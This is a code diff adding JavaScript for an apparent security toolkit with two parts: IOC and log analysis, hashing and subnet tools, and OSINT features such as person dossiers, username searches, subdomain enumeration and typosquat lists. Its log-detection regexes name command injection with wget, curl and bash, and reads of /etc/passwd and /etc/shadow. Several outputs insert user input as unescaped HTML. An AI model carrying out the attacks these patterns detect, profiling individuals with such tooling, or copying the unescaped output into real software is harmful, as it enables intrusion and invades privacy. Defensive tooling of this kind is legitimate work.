+  ['login','signin','verify','update','account','secure','paypal','bank','crypto','password','suspended'].forEach(w=>{if(lv.includes(w))inds.push(`Phishing keyword: "${w}"`);});
+  if(cls.type==='URL'){if(v.length>100)inds.push('Long URL — obfuscation risk');if(v.includes('@'))inds.push('@ in URL — redirect risk');if(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(v))inds.push('IP-based URL');}
+  if(cls.type==='IP Address'){const p=v.split('.').map(Number);if(p[0]===10||(p[0]===172&&p[1]>=16&&p[1]<=31)||(p[0]===192&&p[1]===168))inds.push('Private IP (RFC1918)');else inds.push('Public IP');}
+  const risk=inds.length>=3?{l:'CRITICAL',c:'tag-r'}:inds.length>=2?{l:'HIGH',c:'tag-r'}:inds.length>=1?{l:'MEDIUM',c:'tag-y'}:{l:'CLEAN',c:'tag-g'};
+  return{cls,inds,risk};
+}
+
+function fIOC(){
+  const v=document.getElementById('f-ioc-in').value.trim();
+  if(!v){alert('Enter IOC');return;} incF(true,false);
+  const{cls,inds,risk}=analyzeIOCVal(v);
+  let h=`<div style="margin-bottom:8px"><span class="tag tag-c" style="margin-right:5px">${cls.icon} ${cls.type}</span><span class="tag ${risk.c}">Risk: ${risk.l}</span></div>`;
+  h+=`<div class="out"><span class="in">${v}</span>\n<span class="ky">Type:</span> ${cls.type}\n`;
+  if(inds.length){h+=`\n<span class="er">Indicators (${inds.length}):</span>\n`;inds.forEach(i=>{h+=`  <span class="wa">⚠</span> ${i}\n`;});}
+  else h+=`\n<span class="ok">No suspicious indicators</span>`;
+  h+='</div>';
+  setO('f-ioc-res',h);
+  if(risk.l!=='CLEAN')incF(false,true);
+}
+
+function fBatchIOC(){
+  const lines=document.getElementById('f-batch-in').value.trim().split('\n').filter(Boolean);
+  if(!lines.length){alert('Enter IOCs');return;} incF(true,false);
+  let h='<table><thead><tr><th>IOC</th><th>Type</th><th>Risk</th><th>Top Indicator</th></tr></thead><tbody>';
+  lines.forEach(v=>{
+    v=v.trim();if(!v)return;
+    const{cls,inds,risk}=analyzeIOCVal(v);
+    h+=`<tr><td style="font-size:10px;max-width:180px;word-break:break-all">${v}</td><td>${cls.icon} ${cls.type}</td><td><span class="tag ${risk.c}">${risk.l}</span></td><td style="font-size:9.5px;color:var(--muted)">${inds.length?inds[0]:'—'}</td></tr>`;
+    if(risk.l!=='CLEAN')incF(false,true);
+  });
+  setO('f-batch-res',h+'</tbody></table>');
+}
+
+const LOG_PATTERNS=[
+  {n:'SQL Injection',re:/union.+select|select.+from|drop.+table|'.*or.*'|1=1|--|\/\*/i,s:'CRITICAL'},
+  {n:'XSS Attempt',re:/<script|javascript:|on(load|click|error)=|alert\(/i,s:'HIGH'},
+  {n:'Path Traversal',re:/\.\.\//,s:'HIGH'},
+  {n:'SSH Brute Force',re:/failed password for .+ from .+ port \d+ ssh/i,s:'HIGH'},
+  {n:'Admin Access',re:/\/admin|\/wp-admin|\/phpmyadmin/i,s:'MEDIUM'},
+  {n:'Scanner/Bot',re:/masscan|nmap|nikto|sqlmap|zgrab/i,s:'MEDIUM'},
+  {n:'Cmd Injection',re:/;\s*(ls|cat|wget|curl|chmod|bash|sh)\s/i,s:'CRITICAL'},
+  {n:'LFI',re:/\/(etc\/passwd|etc\/shadow|proc\/self)/i,s:'CRITICAL'},
+  {n:'404 Errors',re:/\s404\s/,s:'LOW'},
+  {n:'500 Errors',re:/\s500\s/,s:'MEDIUM'},
+];
+
+function fLogAnalyze(){
+  const logs=document.getElementById('f-log-in').value;
+  if(!logs){alert('Paste logs');return;} incF(true,false);
+  const lines=logs.split('\n'); const found=[]; const ipC={};
+  const ipRe=/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/g;
+  lines.forEach((line,idx)=>{
+    LOG_PATTERNS.forEach(pat=>{if(pat.re.test(line))found.push({line:idx+1,n:pat.n,s:pat.s,sample:line.trim().substring(0,90)});});
+    const ips=line.match(ipRe); if(ips)ips.forEach(ip=>{ipC[ip]=(ipC[ip]||0)+1;});
+  });
+  const sc={CRITICAL:'tag-r',HIGH:'tag-r',MEDIUM:'tag-y',LOW:'tag-g'};
+  let h='';
+  if(found.length){
+    h+=`<div style="margin-bottom:9px"><span class="tag tag-r">⚠ ${found.length} Events</span></div>`;
+    h+='<table><thead><tr><th>Line</th><th>Pattern</th><th>Severity</th><th>Sample</th></tr></thead><tbody>';
+    found.forEach(f=>{
+      h+=`<tr><td>${f.line}</td><td>${f.n}</td><td><span class="tag ${sc[f.s]}">${f.s}</span></td><td style="font-size:9.5px;color:var(--muted);max-width:220px;word-break:break-all">${f.sample}</td></tr>`;
+      if(f.s==='HIGH'||f.s==='CRITICAL')incF(false,true);
+    });
+    h+='</tbody></table>';
+  } else h+='<div class="out"><span class="ok">No security events detected</span></div>';
+  const topIPs=Object.entries(ipC).sort((a,b)=>b[1]-a[1]).slice(0,5);
+  if(topIPs.length){
+    h+=`<div style="margin-top:12px"><span class="tag tag-c">Top IPs</span></div>`;
+    h+='<table><thead><tr><th>IP</th><th>Count</th><th>Status</th></tr></thead><tbody>';
+    topIPs.forEach(([ip,cnt])=>{h+=`<tr><td class="in">${ip}</td><td>${cnt}</td><td>${cnt>20?'<span class="tag tag-r">HIGH FREQ</span>':cnt>5?'<span class="tag tag-y">NOTABLE</span>':'<span class="tag tag-g">NORMAL</span>'}</td></tr>`;});
+    h+='</tbody></table>';
+  }
+  setO('f-log-res',h);
+}
+
+async function fHash(algo){
+  const text=document.getElementById('f-hash-in').value;
+  if(!text){alert('Enter text');return;} incF(true,false);
+  const enc=new TextEncoder().encode(text);
+  const buf=await crypto.subtle.digest(algo,enc);
+  const hex=Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+  setO('f-hash-res',`<div style="font-size:9px;color:var(--muted);margin-bottom:5px">${algo}</div><div style="background:var(--bg2);border:1px solid var(--muted2);padding:9px 12px;border-radius:3px;font-size:10.5px;color:var(--c1);word-break:break-all">${hex}</div><button class="btn btn-o btn-sm" style="margin-top:5px" onclick="navigator.clipboard.writeText('${hex}').then(()=>toast('Copied!'))">Copy</button>`);
+}
+
+async function fAllHashes(){
+  const text=document.getElementById('f-hash-in').value;
+  if(!text){alert('Enter text');return;} incF(true,false);
+  let h=`<div style="background:var(--bg2);border:1px solid var(--muted2);padding:10px 12px;border-radius:3px;font-size:10px;word-break:break-all;line-height:2">`;
+  h+=`<span class="ky">MD5    </span>: <span class="ok">${md5(text)}</span>\n`;
+  for(const algo of ['SHA-1','SHA-256','SHA-512']){
+    const buf=await crypto.subtle.digest(algo,new TextEncoder().encode(text));
+    const hex=Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    h+=`<span class="ky">${algo.padEnd(7)}</span>: <span class="ok">${hex}</span>\n`;
+  }
+  setO('f-hash-res',h+'</div>');
+}
+
+async function fFileHash(){
+  const file=document.getElementById('f-file-in').files[0];
+  if(!file){alert('Select file');return;} incF(true,false);
+  const buf=await file.arrayBuffer();
+  let h=`<div style="font-size:10px;color:var(--muted);margin-bottom:6px">File: <span style="color:var(--text)">${file.name}</span> (${(file.size/1024).toFixed(1)} KB)</div>`;
+  h+=`<div style="background:var(--bg2);border:1px solid var(--muted2);padding:9px 12px;border-radius:3px;font-size:10px;word-break:break-all;line-height:2">`;
+  h+=`<span class="ky">MD5    </span>: <span class="ok">${md5(new TextDecoder().decode(buf.slice(0,1024)))}</span>\n`;
+  for(const algo of ['SHA-1','SHA-256','SHA-512']){
+    const hashBuf=await crypto.subtle.digest(algo,buf);
+    const hex=Array.from(new Uint8Array(hashBuf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    h+=`<span class="ky">${algo.padEnd(7)}</span>: <span class="ok">${hex}</span>\n`;
+  }
+  setO('f-file-res',h+'</div>');
+}
+
+function fHashCmp(){
+  const a=document.getElementById('f-ha').value.trim().toLowerCase();
+  const b=document.getElementById('f-hb').value.trim().toLowerCase();
+  if(!a||!b){alert('Enter both hashes');return;} incF(true,false);
+  setO('f-hcmp-res',a===b?'<span class="tag tag-g">✓ MATCH — Integrity verified</span>':'<span class="tag tag-r">✗ MISMATCH — File may be tampered</span>');
+}
+
+function fEnc(type){
+  const inp=document.getElementById('f-enc-in').value; let out='';
+  try{
+    if(type==='b64e')out=btoa(unescape(encodeURIComponent(inp)));
+    else if(type==='b64d')out=decodeURIComponent(escape(atob(inp)));
+    else if(type==='urle')out=encodeURIComponent(inp);
+    else if(type==='urld')out=decodeURIComponent(inp);
+    else if(type==='hexe')out=Array.from(inp).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
+    else if(type==='hexd')out=inp.split(/\s+/).map(h=>String.fromCharCode(parseInt(h,16))).join('');
+    else if(type==='bin')out=Array.from(inp).map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ');
+    else if(type==='bind')out=inp.trim().split(/\s+/).map(b=>String.fromCharCode(parseInt(b,2))).join('');
+    else if(type==='rot13')out=inp.replace(/[a-zA-Z]/g,c=>String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<'n'?13:-13)));
+    else if(type==='rev')out=inp.split('').reverse().join('');
+  }catch(e){out='Error: '+e.message;}
+  document.getElementById('f-enc-out').value=out; incF(true,false);
+}
+
+function fCIDR(){
+  const inp=document.getElementById('f-cidr-in').value.trim();
+  if(!inp){alert('Enter CIDR');return;} incF(true,false);
+  try{
+    const[ip,pref]=inp.split('/'); const plen=parseInt(pref);
+    const pts=ip.split('.').map(Number);
+    const ipN=((pts[0]<<24)|(pts[1]<<16)|(pts[2]<<8)|pts[3])>>>0;
+    const mask=plen===0?0:(~0<<(32-plen))>>>0;
+    const netw=(ipN&mask)>>>0; const bcast=(netw|(~mask>>>0))>>>0;
+    const total=Math.pow(2,32-plen); const usable=Math.max(0,total-2);
+    const n2i=n=>[(n>>24)&255,(n>>16)&255,(n>>8)&255,n&255].join('.');
+    const isPriv=pts[0]===10||(pts[0]===172&&pts[1]>=16&&pts[1]<=31)||(pts[0]===192&&pts[1]===168);
+    setO('f-cidr-res',fmtTable([['Network',n2i(netw)],['Broadcast',n2i(bcast)],['Subnet Mask',n2i(mask)],['First Host',n2i(netw+1)],['Last Host',n2i(bcast-1)],['Total Addresses',total.toLocaleString()],['Usable Hosts',usable.toLocaleString()],['Type',isPriv?'Private (RFC1918)':'Public'],['NMAP',`nmap -sV ${n2i(netw)}/${plen}`]]));
+  }catch(e){setO('f-cidr-res',`<span class="er">Error: ${e.message}</span>`);}
+}
+
+function fIPInCIDR(){
+  const ip=document.getElementById('f-ip-chk').value.trim();
+  const cidr=document.getElementById('f-cidr-chk').value.trim();
+  if(!ip||!cidr){alert('Fill both fields');return;} incF(true,false);
+  try{
+    const[nip,pref]=cidr.split('/'); const plen=parseInt(pref);
+    const t=s=>s.split('.').map(Number).reduce((a,b)=>(a<<8)|b);
+    const mask=plen===0?0:(~0<<(32-plen))>>>0;
+    const inR=(t(ip)&mask)>>>0===(t(nip)&mask)>>>0;
+    setO('f-ipr-res',inR?`<span class="tag tag-g">✓ ${ip} IS in ${cidr}</span>`:`<span class="tag tag-r">✗ ${ip} NOT in ${cidr}</span>`);
+  }catch(e){setO('f-ipr-res',`<span class="er">${e.message}</span>`);}
+}
+
+let fReportText='';
+function fGenReport(){
+  const inv=document.getElementById('fr-inv').value||'N/A';
+  const caseR=document.getElementById('fr-case').value||'N/A';
+  const title=document.getElementById('fr-title').value||'N/A';
+  const loc=document.getElementById('fr-loc').value||'N/A';
+  const dev=document.getElementById('fr-dev').value||'N/A';
+  const date=document.getElementById('fr-date').value||new Date().toISOString().split('T')[0];
+  const notes=document.getElementById('fr-notes').value||'No findings recorded.';
+  fReportText=`====================================\n   FORENSICSYS v1.0 — CASE REPORT\n====================================\nGenerated: ${new Date().toISOString()}\n\nCASE INFORMATION\n------------------------------------\nInvestigator : ${inv}\nCase Ref     : ${caseR}\nTitle        : ${title}\nDate         : ${date}\nLocation     : ${loc}\nDevice       : ${dev}\n\nSTATISTICS\n------------------------------------\nQueries Run  : ${fQ}\nAlerts       : ${fA}\n\nFINDINGS\n------------------------------------\n${notes}\n====================================\nEND OF REPORT\n====================================`;
+  setO('fr-preview',`<div class="out">${fReportText.replace(/</g,'&lt;').replace(/\n/g,'<br>')}</div>`);
+  incF(true,false);
+}
+function fExportReport(){if(!fReportText)fGenReport();const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([fReportText],{type:'text/plain'}));a.download=`forensicsys_report_${Date.now()}.txt`;a.click();}
+
+// ══════════════════════════════════════
+// SENTRA FUNCTIONS
+// ══════════════════════════════════════
+const PLATFORMS=[
+  ['GitHub','https://github.com/','Code'],['GitLab','https://gitlab.com/','Code'],['npm','https://www.npmjs.com/~','Code'],
+  ['Twitter/X','https://twitter.com/','Social'],['Instagram','https://www.instagram.com/','Social'],
+  ['TikTok','https://www.tiktok.com/@','Social'],['YouTube','https://www.youtube.com/@','Social'],
+  ['Reddit','https://www.reddit.com/user/','Social'],['Pinterest','https://www.pinterest.com/','Social'],
+  ['LinkedIn','https://www.linkedin.com/in/','Professional'],['Twitch','https://www.twitch.tv/','Gaming'],
+  ['Steam','https://steamcommunity.com/id/','Gaming'],['Medium','https://medium.com/@','Blog'],
+  ['Dev.to','https://dev.to/','Blog'],['HackerRank','https://www.hackerrank.com/','Hacking'],
+  ['HackTheBox','https://app.hackthebox.com/profile/','Hacking'],['Keybase','https://keybase.io/','Crypto'],
+  ['Pastebin','https://pastebin.com/u/','Data'],['Behance','https://www.behance.net/','Design'],
+  ['Dribbble','https://dribbble.com/','Design'],['Telegram','https://t.me/','Messaging'],
+  ['Mastodon','https://mastodon.social/@','Social'],['Substack','https://substack.com/@','Blog'],
+  ['Quora','https://www.quora.com/profile/','QnA'],['Kaggle','https://www.kaggle.com/','Data'],
+  ['Replit','https://replit.com/@','Code'],['CodePen','https://codepen.io/','Code'],
+  ['Fiverr','https://www.fiverr.com/','Work'],['Upwork','https://www.upwork.com/freelancers/~','Work'],
+  ['SoundCloud','https://soundcloud.com/','Music'],['Spotify','https://open.spotify.com/user/','Music'],
+  ['Flickr','https://www.flickr.com/people/','Photos'],['Vimeo','https://vimeo.com/','Video'],
+  ['ProductHunt','https://www.producthunt.com/@','Tech'],['AngelList','https://angel.co/u/','Startup'],
+  ['Chess.com','https://www.chess.com/member/','Gaming'],['Roblox','https://www.roblox.com/user.aspx?username=','Gaming'],
+  ['Bitbucket','https://bitbucket.org/','Code'],['PyPI','https://pypi.org/user/','Code'],
+  ['Freelancer','https://www.freelancer.com/u/','Work'],['AboutMe','https://about.me/','Identity'],
+  ['Gravatar','https://www.gravatar.com/','Identity'],['WordPress','https://wordpress.com/u/','Blog'],
+  ['Ask.fm','https://ask.fm/','Social'],['Codecademy','https://www.codecademy.com/profiles/','Education'],
+  ['StackOverflow','https://stackoverflow.com/users/','Code'],['JSFiddle','https://jsfiddle.net/user/','Code'],
+  ['Dailymotion','https://www.dailymotion.com/','Video'],['Lichess','https://lichess.org/@/','Gaming'],
+];
+
+function sUsername(){
+  const u=document.getElementById('s-un-val').value.trim();
+  const cat=document.getElementById('s-un-cat').value;
+  if(!u){alert('Enter username');return;} incS(true,false,false);
+  const filtered=cat==='all'?PLATFORMS:PLATFORMS.filter(p=>p[2]===cat);
+  document.getElementById('s-un-prog').style.width='100%';
+  document.getElementById('s-un-st').textContent=`${filtered.length} platform links generated`;
+  let h='<div class="pl-grid">';
+  filtered.forEach(([name,base,cat2])=>{
+    h+=`<a href="${base+u}" target="_blank" class="pl-item"><span style="font-size:11px">🔗</span><div><div class="pl-name">${name}</div><div class="pl-cat">${cat2}</div></div></a>`;
+  });
+  h+='</div>';
+  setO('s-un-links',h);
+  setO('s-un-out',`<span class="ok">USERNAME: ${u}</span>\n<span class="ky">Platforms:</span> <span class="in">${filtered.length}</span>\n<span class="ky">Category:</span> <span class="in">${cat}</span>\n\n<span class="wa">Click links above to verify each profile manually.\nNote: Link existence ≠ active profile.</span>`);
+  setTimeout(()=>document.getElementById('s-un-prog').style.width='0%',1500);
+}
+
+async function sEmail(){
+  const em=document.getElementById('s-em-val').value.trim();
+  if(!em){alert('Enter email');return;} incS(true,false,false);
+  setO('s-em-out',sp());
+  const domain=em.split('@')[1]||'';
+  const disp=['mailinator','guerrillamail','temp-mail','yopmail','trashmail','dispostable'].some(d=>domain.includes(d));
+  const free=['gmail','yahoo','hotmail','outlook','protonmail','icloud','aol'].some(d=>domain.includes(d));
+  const tld='.'+domain.split('.').pop();
+  let h=`<span class="ok">EMAIL INTEL // ${em}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  h+=`<span class="ky">Format Valid  </span>: ${/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)?'<span class="ok">YES</span>':'<span class="er">NO</span>'}\n`;
+  h+=`<span class="ky">Domain        </span>: <span class="in">${domain}</span>\n`;
+  h+=`<span class="ky">Free Provider </span>: ${free?'<span class="wa">YES</span>':'<span class="ok">NO (custom)</span>'}\n`;
+  h+=`<span class="ky">Disposable    </span>: ${disp?'<span class="er">YES — SUSPICIOUS</span>':'<span class="ok">NO</span>'}\n`;
+  h+=`<span class="ky">Risky TLD     </span>: ${['.tk','.ml','.ga','.cf'].includes(tld)?'<span class="er">YES</span>':'<span class="ok">NO</span>'}\n\n`;
+  h+=`<span class="ky">HIBP Check    </span>: <span class="dv">→ https://haveibeenpwned.com/account/${em}</span>\n`;
+  h+=`<span class="ky">Hunter.io     </span>: <span class="dv">→ https://hunter.io/email-verifier/${em}</span>\n`;
+  h+=`<span class="ky">EmailRep      </span>: <span class="dv">→ https://emailrep.io/${em}</span>\n\n`;
+  setO('s-em-out',h);
+  try{
+    const r=await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+    const d=await r.json();
+    let mx='';
+    if(d.Answer&&d.Answer.length){mx=`<span class="ky">MX Records:</span>\n`;d.Answer.forEach(a=>{mx+=`  <span class="ok">✔</span> <span class="in">${a.data}</span>\n`;});}
+    else mx=`<span class="wa">No MX records — domain may not receive email</span>\n`;
+    const cur=document.getElementById('s-em-out').innerHTML;
+    setO('s-em-out',cur+mx);
+  }catch(e){}
+  if(disp)incS(false,false,true);
+}
+
+function sPhone(){
+  const ph=document.getElementById('s-ph-val').value.trim();
+  if(!ph){alert('Enter phone');return;} incS(true,false,false);
+  const cleaned=ph.replace(/[\s\-\(\)]/g,'');
+  const cc=cleaned.startsWith('+')?cleaned.slice(1,3):'??';
+  const ccMap={'1':'US/Canada','44':'UK','91':'India','81':'Japan','49':'Germany','33':'France','86':'China','7':'Russia','61':'Australia','55':'Brazil','92':'Pakistan','880':'Bangladesh','971':'UAE'};
+  let h=`<span class="ok">PHONE INTEL // ${ph}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  h+=`<span class="ky">Cleaned       </span>: <span class="in">${cleaned}</span>\n`;
+  h+=`<span class="ky">Country Code  </span>: <span class="in">+${cc}</span>\n`;
+  h+=`<span class="ky">Country       </span>: <span class="in">${ccMap[cc]||ccMap[cleaned.slice(1,2)]||'Unknown'}</span>\n`;
+  h+=`<span class="ky">Length        </span>: <span class="in">${cleaned.replace('+','').length} digits</span>\n`;
+  h+=`<span class="ky">Format        </span>: ${cleaned.startsWith('+')?'<span class="ok">E.164</span>':'<span class="wa">Non-standard</span>'}\n\n`;
+  h+=`<span class="ky">Truecaller    </span>: <span class="dv">→ https://www.truecaller.com/search/${cleaned}</span>\n`;
+  h+=`<span class="ky">Spy Dialer    </span>: <span class="dv">→ https://www.spydialer.com/default.aspx?page=phone&phone=${cleaned}</span>\n`;
+  setO('s-ph-out',h);
+}
+
+function sPerson(){
+  const name=document.getElementById('s-ps-name').value.trim();
+  if(!name){alert('Enter name');return;} incS(true,false,false);
+  const loc=document.getElementById('s-ps-loc').value.trim();
+  const co=document.getElementById('s-ps-co').value.trim();
+  const un=document.getElementById('s-ps-un').value.trim();
+  const enc=encodeURIComponent;
+  let h=`<span class="ok">PERSON DOSSIER // ${name}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  h+=`<span class="ky">Name    </span>: <span class="in">${name}</span>\n`;
+  if(loc)h+=`<span class="ky">Location</span>: <span class="in">${loc}</span>\n`;
+  if(co)h+=`<span class="ky">Company </span>: <span class="in">${co}</span>\n`;
+  if(un)h+=`<span class="ky">Username</span>: <span class="in">${un}</span>\n`;
+  h+=`\n<span class="ky">[Search Links]</span>\n`;
+  h+=`  <span class="dv">Google    → </span><span class="in">https://www.google.com/search?q=${enc('"'+name+'"'+(loc?' '+loc:'')+(co?' '+co:''))}</span>\n`;
+  h+=`  <span class="dv">LinkedIn  → </span><span class="in">https://www.linkedin.com/search/results/people/?keywords=${enc(name)}</span>\n`;
+  h+=`  <span class="dv">Twitter   → </span><span class="in">https://twitter.com/search?q=${enc('"'+name+'"')}&f=user</span>\n`;
+  h+=`  <span class="dv">Facebook  → </span><span class="in">https://www.facebook.com/search/people/?q=${enc(name)}</span>\n`;
+  h+=`  <span class="dv">Pipl      → </span><span class="in">https://pipl.com/search/?q=${enc(name)}</span>\n`;
+  setO('s-ps-out',h);
+}
+
+async function sIP(){
+  const ip=document.getElementById('s-ip-val').value.trim(); incS(true,true,false);
+  setO('s-ip-out',sp());
+  try{
+    const r=await fetch(ip?`https://ipapi.co/${ip}/json/`:'https://ipapi.co/json/');
+    const d=await r.json();
+    if(d.error){setO('s-ip-out',`<span class="er">${d.reason}</span>`);return;}
+    let h=`<span class="ok">IP INTEL // ${d.ip}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+    h+=fmtOut({'IP':d.ip,'Country':`${d.country_name} (${d.country_code})`,'Region':d.region,'City':d.city,'Postal':d.postal||'N/A','Latitude':d.latitude,'Longitude':d.longitude,'Timezone':d.timezone,'ISP/Org':d.org||'N/A','ASN':d.asn||'N/A','Calling Code':'+'+d.country_calling_code,'Currency':d.currency});
+    h+=`\n\n<span class="ky">[Links]</span>\n  <span class="dv">AbuseIPDB → </span><span class="in">https://www.abuseipdb.com/check/${d.ip}</span>\n  <span class="dv">Shodan    → </span><span class="in">https://www.shodan.io/host/${d.ip}</span>`;
+    setO('s-ip-out',h);
+  }catch(e){setO('s-ip-out',`<span class="er">${e.message}</span>`);}
+}
+
+async function sDomain(){
+  const host=document.getElementById('s-dr-val').value.trim();
+  if(!host){alert('Enter domain');return;} incS(true,true,false);
+  setO('s-dr-out',sp());
+  let h=`<span class="ok">DOMAIN RECON // ${host}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  try{
+    for(let t of['A','MX','NS','TXT']){
+      const r=await fetch(`https://dns.google/resolve?name=${host}&type=${t}`);
+      const d=await r.json();
+      if(d.Answer&&d.Answer.length){h+=`<span class="ky">[${t}]</span>\n`;d.Answer.slice(0,3).forEach(a=>{h+=`  <span class="in">${a.data.substring(0,75)}</span>\n`;});h+='\n';}
+    }
+  }catch(e){}
+  try{
+    const r=await fetch(`https://ipapi.co/${host}/json/`);const d=await r.json();
+    if(d.ip){h+=`<span class="ky">[IP]</span>: <span class="in">${d.ip}</span>  <span class="dv">${d.country_name} · ${d.city} · ${d.org||'N/A'}</span>\n\n`;}
+  }catch(e){}
+  h+=`<span class="ky">[External]</span>\n  <span class="dv">WHOIS   → </span><span class="in">https://www.whois.com/whois/${host}</span>\n  <span class="dv">crt.sh  → </span><span class="in">https://crt.sh/?q=${host}</span>\n  <span class="dv">Shodan  → </span><span class="in">https://www.shodan.io/search?query=${host}</span>\n  <span class="dv">Archive → </span><span class="in">https://web.archive.org/web/*/${host}</span>`;
+  setO('s-dr-out',h);
+}
+
+async function sDNS(){
+  const host=document.getElementById('s-dns-val').value.trim();
+  const type=document.getElementById('s-dns-type').value;
+  if(!host){alert('Enter domain');return;} incS(true,true,false);
+  setO('s-dns-out',sp());
+  try{
+    const types=type==='ALL'?['A','AAAA','MX','NS','TXT','CNAME','SOA']:[type];
+    let h=`<span class="ok">DNS LOOKUP // ${host}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+    for(let t of types){
+      const r=await fetch(`https://dns.google/resolve?name=${host}&type=${t}`);
+      const d=await r.json();
+      h+=`<span class="ky">[${t}]</span> `;
+      if(d.Answer&&d.Answer.length){h+=`<span class="ok">${d.Answer.length} records</span>\n`;d.Answer.forEach(a=>{h+=`  <span class="in">${a.data.substring(0,80)}</span>  <span class="dv">TTL:${a.TTL}</span>\n`;});}
+      else h+=`<span class="dv">No records</span>\n`;
+      h+='\n';
+    }
+    setO('s-dns-out',h);
+  }catch(e){setO('s-dns-out',`<span class="er">${e.message}</span>`);}
+}
+
+async function sSSL(){
+  const host=document.getElementById('s-ssl-val').value.trim();
+  if(!host){alert('Enter domain');return;} incS(true,false,false);
+  setO('s-ssl-out',sp());
+  try{
+    const r=await fetch(`https://crt.sh/?q=${host}&output=json`);
+    const d=await r.json();
+    let h=`<span class="ok">SSL CERT INTEL // ${host}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+    if(d&&d.length){
+      const latest=d[0];
+      const exp=new Date(latest.not_after); const daysLeft=Math.floor((exp-Date.now())/86400000);
+      h+=`<span class="ky">Common Name  </span>: <span class="in">${latest.common_name}</span>\n`;
+      h+=`<span class="ky">Not Before   </span>: <span class="in">${latest.not_before}</span>\n`;
+      h+=`<span class="ky">Not After    </span>: <span class="in">${latest.not_after}</span>\n`;
+      h+=`<span class="ky">Days Left    </span>: ${daysLeft>30?'<span class="ok">'+daysLeft+' days</span>':daysLeft>0?'<span class="wa">'+daysLeft+' days (renew soon)</span>':'<span class="er">EXPIRED</span>'}\n`;
+      h+=`<span class="ky">Total Certs  </span>: <span class="in">${d.length}</span>\n\n`;
+      h+=`<span class="ky">SSL Labs → </span><span class="dv">https://www.ssllabs.com/ssltest/analyze.html?d=${host}</span>\n`;
+    } else h+=`<span class="wa">No certs found on crt.sh</span>`;
+    setO('s-ssl-out',h);
+  }catch(e){setO('s-ssl-out',`<span class="er">${e.message}</span>`);}
+}
+
+const SD_MINI=['www','mail','ftp','smtp','api','dev','admin','portal','vpn','test'];
+const SD_STD=[...SD_MINI,'blog','shop','store','forum','support','help','cdn','static','media','docs','wiki','git','jenkins','staging','beta','prod','uat','qa','demo','app','secure','m','mobile','auth','login','dashboard','status','health','v2'];
+const SD_LARGE=[...SD_STD,'alpha','smtp2','mail2','mx','autodiscover','cpanel','ftp2','sftp','data','reports','analytics','metrics','logs','rdp','vpn2','bastion','mgmt','crm','billing','sandbox','preview','eu','us','asia','monitoring','grafana','kibana','elastic'];
+
+async function sSub(){
+  const host=document.getElementById('s-sub-val').value.trim();
+  if(!host){alert('Enter domain');return;}
+  const size=document.getElementById('s-sub-size').value;
+  const wl=size==='mini'?SD_MINI:size==='std'?SD_STD:SD_LARGE;
+  const btn=document.getElementById('s-sub-btn'); btn.disabled=true;
+  incS(true,false,false); setO('s-sub-out',sp());
+  const found=[]; let done=0;
+  for(let sub of wl){
+    done++;
+    document.getElementById('s-sub-prog').style.width=(done/wl.length*100)+'%';
+    document.getElementById('s-sub-st').textContent=`Checking ${sub}.${host}...`;
+    try{
+      const r=await fetch(`https://dns.google/resolve?name=${sub}.${host}&type=A`);
+      const d=await r.json();
+      if(d.Answer&&d.Answer.length){found.push({sub:`${sub}.${host}`,ip:d.Answer[0].data});incS(false,true,false);}
+    }catch(e){}
+  }
+  btn.disabled=false;
+  document.getElementById('s-sub-prog').style.width='0%';
+  document.getElementById('s-sub-st').textContent=`Done — ${found.length} found`;
+  let h=`<span class="ok">SUBDOMAIN ENUM // ${host}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  h+=`<span class="ky">Wordlist  </span>: <span class="in">${wl.length} words</span>\n<span class="ky">Found     </span>: <span class="${found.length?'ok':'wa'}">${found.length}</span>\n\n`;
+  if(found.length){h+=`<span class="ok">DISCOVERED:</span>\n`;found.forEach(f=>{h+=`  <span class="ok">✔</span> <span class="ky">${f.sub.padEnd(40)}</span><span class="in">${f.ip}</span>\n`;});}
+  else h+=`<span class="wa">No subdomains found. Try larger wordlist or crt.sh.</span>`;
+  setO('s-sub-out',h);
+}
+
+function sTypo(){
+  const domain=document.getElementById('s-ty-val').value.trim();
+  if(!domain){alert('Enter domain');return;} incS(true,false,false);
+  document.getElementById('s-ty-prog').style.width='100%';
+  const parts=domain.split('.');const name=parts.slice(0,-1).join('.');const ext=parts[parts.length-1];
+  const typos=new Set();
+  const subs={'a':'4','e':'3','i':'1','o':'0','s':'5','l':'1','g':'9'};
+  for(let i=0;i<name.length;i++)if(subs[name[i]])typos.add(name.slice(0,i)+subs[name[i]]+name.slice(i+1)+'.'+ext);
+  for(let i=0;i<name.length-1;i++)typos.add(name.slice(0,i)+name[i+1]+name[i]+name.slice(i+2)+'.'+ext);
+  for(let i=0;i<name.length;i++)typos.add(name.slice(0,i)+name.slice(i+1)+'.'+ext);
+  ['com','net','org','io','co','info','biz','us','xyz'].forEach(t=>typos.add(name+'.'+t));
+  for(let i=1;i<name.length;i++)typos.add(name.slice(0,i)+'-'+name.slice(i)+'.'+ext);
+  ['www','secure','login','account','support','my'].forEach(p=>{typos.add(p+'-'+name+'.'+ext);typos.add(p+name+'.'+ext);});
+  typos.delete(domain);
+  const list=[...typos].sort();
+  setO('s-ty-out',`<span class="ok">TYPOSQUAT // ${domain}</span>\n<span class="ky">Total:</span> <span class="in">${list.length}</span> permutations\n\n${list.slice(0,20).map(d=>`  <span class="wa">!</span> <span class="in">${d}</span>`).join('\n')}${list.length>20?`\n  <span class="dv">... and ${list.length-20} more</span>`:''}`);
+  let grid='<div class="ty-grid">';
